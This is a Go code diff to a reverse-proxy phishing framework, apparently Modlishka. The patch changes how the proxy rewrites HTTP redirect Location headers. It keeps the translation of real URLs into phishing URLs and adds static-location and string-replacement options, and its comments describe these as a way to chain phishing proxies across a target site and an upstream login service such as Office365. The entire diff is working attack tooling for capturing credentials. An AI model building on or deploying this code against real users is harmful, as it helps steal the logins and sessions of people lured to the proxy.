@@ -257,31 +257,77 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	if len(httpResponse.Header["WWW-Authenticate"]) > 0 {
 		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
 		newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)
-
 		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
 		httpResponse.Header.Set("WWW-Authenticate", newAuth)
 	}
 
-	//handle 302
-	if httpResponse.Header.Get("Location") != "" {
-		oldLocation := httpResponse.Header.Get("Location")
-		newLocation := runtime.RegexpUrl.ReplaceAllStringFunc(string(oldLocation), runtime.RealURLtoPhish)
+	// ---- Handle 302 redirects ----
+    /*
+        It's often useful to chain Modlishka instances, enabling one to proxy for multiple
+        applications to achieve some objective. This becomes possible by preventing translation
+        of FQDN in the original location header to one of our choosing. This is particularly
+        useful when a base landing page forwards the user to an upstream authentication service
+        such as Office365, which will redirect the user back to the original service once
+        authentication is finished.
+    */
 
+    // Get the current Location header
+    oldLocation := httpResponse.Header.Get("Location")
+	if oldLocation != "" {
+
+        // Copy the original location to receive updates for the upstream location
+        newLocation := oldLocation[:]
+
+        // Force HTTPS if configured to do so
 		if runtime.ForceHTTPS == true {
 			newLocation = strings.Replace(newLocation, "http://", "https://", -1)
 		} else if runtime.ForceHTTP == true {
 			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
 		}
 
-		if len(runtime.TargetResources) > 0 {
-			for _, res := range runtime.TargetResources {
-				newLocation = strings.Replace(newLocation, res, runtime.RealURLtoPhish(res), -1)
-			}
-		}
+        if len(runtime.ReplaceStrings) > 0 {
 
-		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
+            log.Debugf("Patching Location header for static redirect")
+            for k, v := range runtime.ReplaceStrings {
+                newLocation = strings.ReplaceAll(newLocation,k,v)
+            }
+
+        }
+
+        // Handle static location values
+        // This flag will determine if real FQDNs in the location header should
+        // be translated into phish FQDNs
+        static_location := false
+        if len(runtime.StaticLocations) > 0 {
+            for _, v := range runtime.StaticLocations{
+                log.Debugf("Searching location for static signature: %s --> %s",v,newLocation)
+                if strings.Contains(newLocation,v) {
+                    static_location = true
+                    break
+                }
+            }
+        }
+
+        // Translate to Phish URL if the location is not a static location
+        // This logic is added to enable controlled redirects to upstream Modlishka instances
+        if !static_location {
+            log.Debugf("Patching Location header for non-static redirect")
+            newLocation = runtime.RegexpUrl.ReplaceAllStringFunc(string(oldLocation), runtime.RealURLtoPhish)
+		    if len(runtime.TargetResources) > 0 {
+			    for _, res := range runtime.TargetResources {
+				    newLocation = strings.Replace(newLocation, res, runtime.RealURLtoPhish(res), -1)
+                }
+            }
+        }
+
+        // Apply the new header
 		httpResponse.Header.Set("Location", newLocation)
+
+        // Log the event
+		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
 	}
+
+    // ---- Finished handling 302 redirects ----
 
 	return
 }
